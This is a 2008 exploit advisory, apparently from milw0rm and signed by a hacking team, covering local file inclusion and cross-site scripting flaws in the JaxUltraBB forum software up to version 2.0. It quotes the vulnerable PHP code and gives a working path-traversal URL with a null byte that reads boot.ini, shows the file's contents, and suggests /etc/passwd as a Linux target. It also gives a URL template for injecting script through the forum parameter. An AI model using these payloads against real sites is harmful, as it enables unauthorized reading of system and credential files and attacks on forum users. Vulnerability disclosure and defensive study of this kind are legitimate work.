@@ -1,0 +1,81 @@
+===============================================================
+  JaxUltraBB <= 2.0 (LFI/XSS) Multiple Remote Vulnerabilities
+===============================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+
+AUTHOR : CWH Underground
+DATE   : 20 June 2008
+SITE   : www.citec.us
+
+
+#####################################################
+ APPLICATION : JaxUltraBB
+ VERSION     : <= 2.0
+ DOWNLOAD    : http://downloads.sourceforge.net/jubb/
+#####################################################
+
+--- Local File Inclusion ---
+
+-----------------------------------
+ Vulnerable File [viewprofile.php]
+-----------------------------------
+@Line 8-9
+
+   8: $userfile = file_get_contents("users/".$_GET['user'].".JaxSQL");
+   9: $onlinefile = file_get_contents("users/".$_GET['user']."online.JaxSQL");
+
+--------------
+ POC Exploits
+--------------
+
+[+] http://192.168.24.25/jubb/viewprofile.php?user=../../../../../../../../boot.ini%00
+
+
+    This exploit will open boot.ini in system file:
+
+[boot loader] timeout=30 default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS [operating systems] multi(0)disk(0)rdisk(0)partition(1)
+\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect [boot loader] timeout=30 default=multi(0)disk(0)rdisk(0)partition(1)
+\WINDOWS [operating systems] multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect
+
+    You can change boot.ini to /etc/passwd%00 in linux OS.
+
+
+--- Remote XSS Exploit ---
+
+---------------------------------
+ Vulnerable File [viewforum.php]
+---------------------------------
+
+@Line 
+
+  14: $forum = $_GET['forum'];
+
+  15: online_moved("Viewing ".$_GET['forum']);
+
+  17: $forumfile = fopen("topics/".$forum."topics.JaxSQL", "at");
+  18: $topicsfile = file_get_contents("topics/".$forum."topics.JaxSQL", "at");
+  19: echo "<br><br><br><table><td background='img/header1.jpg' width='1000' align='center'>$forum</td><tr><td bgColor='darkblue'>";
+
+---------
+ Exploit
+---------
+
+[+] http://[Target]/[jubb_path]/viewforum.php?forum=<XSS>
+
+##################################################################
+# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
+##################################################################
+
+# milw0rm.com [2008-06-20]
